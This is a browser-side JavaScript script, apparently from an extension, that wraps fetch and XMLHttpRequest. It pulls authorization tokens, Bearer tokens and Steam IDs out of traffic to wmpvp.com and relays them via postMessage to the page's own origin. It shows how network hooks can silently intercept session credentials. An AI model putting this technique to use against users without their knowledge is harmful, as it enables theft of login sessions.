

(function () {
    'use strict';
    if (window.__spsPwHookInstalled) return;   
    window.__spsPwHookInstalled = true;

    var TOKEN_CHARS_RE = /^[A-Za-z0-9._~+/=-]{16,512}$/;
    var URLISH_RE = /(:\/\/|\.(?:com|cn|net|org|io|html?|js|json|png|jpe?g|gif|svg|css|woff2?|map)$)/i;
    
    var TOKEN_KEY_RE = /(^|["'\s{,])(token|access_?token|steam_cn_token|x-token)["'\s]*[:=]["'\s]*([A-Za-z0-9._~+/=-]{16,512})/i;
    var BEARER_RE = /\bBearer\s+([A-Za-z0-9._~+/=-]{16,512})/i;

    var MY_SID_RE = /(^|["'\s{,])(mysteamid|my_steam_?id|my_?steamid64)["'\s]*[:=]["'\s]*(7656119\d{10})/i;
    
    var HEADER_NAME_RE = /^(token|authorization|x-token|access_?token|steam_cn_token)$/i;

    function isWmpvpUrl( u) {
        try {
            const h = new URL(String(u || ''), location.href).hostname.toLowerCase();
            return h === 'wmpvp.com' || h.endsWith('.wmpvp.com');
        } catch (e) { return false; }
    }

    function asToken( v) {
        const s = String(v == null ? '' : v).trim().replace(/^bearer\s+/i, '').trim();
        if (!TOKEN_CHARS_RE.test(s)) return '';
        if (!/[A-Za-z]/.test(s)) return '';          
        if (URLISH_RE.test(s)) return '';            
        return s;
    }

    var SELF_ORIGIN = (function () {
        try { var o = location.origin; return (o && o !== 'null') ? o : '*'; } catch (e0) { return '*'; }
    })();

    function send( tok,  source,  sid = '') {
        try { window.postMessage({ __spsPwToken: 1, token: tok || '', steamid: sid || '', source: source }, SELF_ORIGIN); } catch (e) {  }
    }

    function headerToken( v) {
        return asToken(v);
    }

    function scanText( txt,  source) {
        if (!txt || typeof txt !== 'string' || txt.length > 2e6) return;
        const sid = MY_SID_RE.exec(txt);
        const mt = TOKEN_KEY_RE.exec(txt);
        const mb = mt ? null : BEARER_RE.exec(txt);
        if (mt || sid || mb) send(mt ? asToken(mt[3]) : (mb ? asToken(mb[1]) : ''), source, sid ? sid[3] : '');
    }

    function scanHeaders( hs,  source) {
        try {
            if (!hs) return;
            if (typeof hs.forEach === 'function' && typeof hs.get === 'function') {   
                hs.forEach(( v,  k) => { if (HEADER_NAME_RE.test(String(k || ''))) { const t = headerToken(v); if (t) send(t, source); } });
                return;
            }
            if (Array.isArray(hs)) {
                for (const pair of hs) { if (pair && HEADER_NAME_RE.test(String(pair[0] || ''))) { const t = headerToken(pair[1]); if (t) send(t, source); } }
                return;
            }
            if (typeof hs === 'object') {
                for (const k in hs) { if (HEADER_NAME_RE.test(String(k))) { const t = headerToken(hs[k]); if (t) send(t, source); } }
            }
        } catch (e) {  }
    }

    const _fetch = window.fetch;
    if (typeof _fetch === 'function') {
        window.fetch = function (input, init) {
            let watchRes = false;
            try {
                const req =  (input);   
                const url = (req && typeof req === 'object' && req.url) ? String(req.url) : String(input || '');
                if (isWmpvpUrl(url)) {
                    watchRes = true;
                    try { scanHeaders((init && init.headers) || (req && req.headers) || null, 'req_header'); } catch (e0) {  }
                    try { const b = init && init.body; if (typeof b === 'string') scanText(b, 'req_body'); } catch (e1) {  }
                }
            } catch (e4) {  }
            const p = _fetch.apply(this, arguments);   
            if (watchRes) {
                try {
                    p.then(( res) => {
                        try { if (res && res.clone) res.clone().text().then(( t) => scanText(t, 'res_body')).catch(() => {}); } catch (e2) {  }
                    }).catch(() => {});
                } catch (e5) {  }
            }
            return p;
        };
    }

    const XO = window.XMLHttpRequest;
    if (typeof XO === 'function' && XO.prototype) {
        const XP =  (XO.prototype);
        const OPEN = XP.open, SEND = XP.send, SH = XP.setRequestHeader;
        XP.open = function () {
            try { this.__spsPwU = String(arguments[1] || ''); } catch (e0) {  }
            return OPEN.apply(this, arguments);
        };
        XP.setRequestHeader = function (n, v) {
            try {
                if (HEADER_NAME_RE.test(String(n || '')) && isWmpvpUrl(this.__spsPwU || '')) {
                    const t = headerToken(v);
                    if (t) send(t, 'req_header');
                }
            } catch (e1) {  }
            return SH.apply(this, arguments);
        };
        XP.send = function () {

            const xhr =  (this);
            try {
                if (isWmpvpUrl(xhr.__spsPwU || '')) {
                    const b = arguments[0];
                    if (typeof b === 'string') scanText(b, 'req_body');

                    if (!xhr.__spsLoadHooked) {
                        xhr.__spsLoadHooked = true;
                        xhr.addEventListener('load', () => {
                            try {
                                if (isWmpvpUrl(xhr.__spsPwU || '')) scanText(String(xhr.responseText || ''), 'res_body');
                            } catch (e2) {  }
                        });
                    }
                }
            } catch (e3) {  }
            return SEND.apply(this, arguments);
        };
    }
})();
